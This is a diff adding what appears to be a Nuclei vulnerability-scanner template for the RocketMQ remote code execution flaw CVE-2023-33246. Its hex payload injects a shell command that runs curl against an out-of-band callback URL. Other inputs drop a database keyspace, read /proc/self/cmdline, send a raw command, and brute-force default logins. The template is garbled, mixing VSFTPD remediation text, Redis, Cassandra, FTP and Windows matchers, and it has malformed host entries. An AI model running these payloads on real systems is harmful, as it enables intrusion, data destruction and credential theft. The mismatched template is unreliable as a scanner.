@@ -1,0 +1,128 @@
+id: CVE-2023-33246
+
+info:
+  name: RocketMQ <= 5.1.0 - Remote Code Execution
+  author: iamnoooob,rootxharsh,pdresearch
+  severity: critical
+  description: |
+    For RocketMQ versions 5.1.0 and below, under certain conditions, there is a risk of remote command execution. Several components of RocketMQ, including NameServer, Broker, and Controller, are leaked on the extranet and lack permission verification, an attacker can exploit this vulnerability by using the update configuration function to execute commands as the system users that RocketMQ is running as. Additionally, an attacker can achieve the same effect by forging the RocketMQ protocol content. To prevent these attacks, users are recommended to upgrade to version 5.1.1 or above for using RocketMQ 5.x or 4.9.6 or above for using RocketMQ 4.x .
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2023-33246
+    - https://github.com/I5N0rth/CVE-2023-33246
+  remediation: |
+    Update to the latest version of VSFTPD, which does not contain the backdoor.
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cve-id: CVE-2023-33246
+    cwe-id: CWE-94
+    epss-score: 0.00045
+    cpe: cpe:2.3:a:apache:rocketmq:*:*:*:*:*:*:*:*
+  metadata:
+    max-request: 1
+    verified: true
+    shodan-query: title:"RocketMQ"
+    fofa-query: protocol="rocketmq"
+  tags: cve,cve2023,rocketmq,rce,oast
+
+variables:
+  part_a: '{{ hex_decode ("000000d2000000607b22636f6465223a32352c22666c6167223a302c226c616e6775616765223a224a415641222c226f7061717565223a302c2273657269616c697a655479706543757272656e74525043223a224a534f4e222c2276657273696f6e223a3339357d66696c7465725365727665724e756d733d310a726f636b65746d71486f6d653d2d632024407c7368202e206563686f206375726c20") }}'
+  part_b: '{{ hex_decode("3b0a") }}'
+
+tcp:
+  - host:
+      - "{{Hostname}}"
+      - "{{Host}}:10911"
+      - "tls://{Hostname}}"
+      - "tls://{{Host}}:6380"
+    inputs:
+      - data: '{{ part_a + "{{interactsh-url}}" + "/////////////" + part_b  }}'
+        type: hex
+        read: 1024
+
+      - data: "0500000101000000530003000b4452495645525f4e414d450016446174615374617820507974686f6e20447269766572000e4452495645525f56455253494f4e0006332e32352e30000b43514c5f56455253494f4e0005332e342e35"
+        read: 1024
+        type: hex
+
+      - data: "3e000218aeb50500000307000000350000001d64726f70204b455953504143452049462045584953545320746573743b0001000000340000006400080005d82cc8ca0e4fcdde8c0a"
+        type: hex
+        read: 1024
+
+      - data: "site cpfr /proc/self/cmdline\r\n"
+        read: 1024
+  
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(raw,'serializeTypeCurrentRPC')
+          - contains(interactsh_protocol,'dns')
+        condition: and
+
+      - type: word
+        part: raw
+        words:
+          - "123123"
+          - "Unknown STOMP action"
+
+      - type: binary
+        binary:
+          - "300c02010161070a010004000400"
+
+      - type: word
+        part: body # [body、raw、。。。]
+        name: ip
+        words:
+          - "Interface"
+          - "Mode"
+          - "User"
+        condition: and # [and、or、。。。]
+        case-insensitive: true
+
+      - type: word # [word、dsl、regex、。。。]
+        encoding: hex
+        name: win7or2008R2
+        words:
+          - "00000034fffe3900000020006e007400200061007500740068006f0072006900740079005c00730079007300740065006d000a0000000000"
+
+    extractors:
+      - type: regex
+        name: stats
+        regex:
+          - "ProviderVersion...([0-9.]+)"
+
+      - type: regex
+        part: body
+        group: 1
+        name: value
+        regex:
+          - "HELO:(.*).false"
+          - "hostName=s:([0-9.]+)"
+  
+
+  - inputs:
+      - data: "{{cmd}}\n"
+        read: 100
+      - data: "USER {{username}}\r\nPASS {{password}}\r\n"
+
+    host:
+      - "{{Hostname}}"
+      - "{{Host}}:6379"
+      - "tls://{Hostname}}"
+      - "tls://{{Host}}:6380"
+    read-size: 1024
+    attack: clusterbomb
+    payloads:
+      username:
+        - admin
+        - root
+      password:
+        - password
+        - toor
+        - nas
+
+    matchers:
+      - type: word
+        words:
+          - "230 Login successful"
+
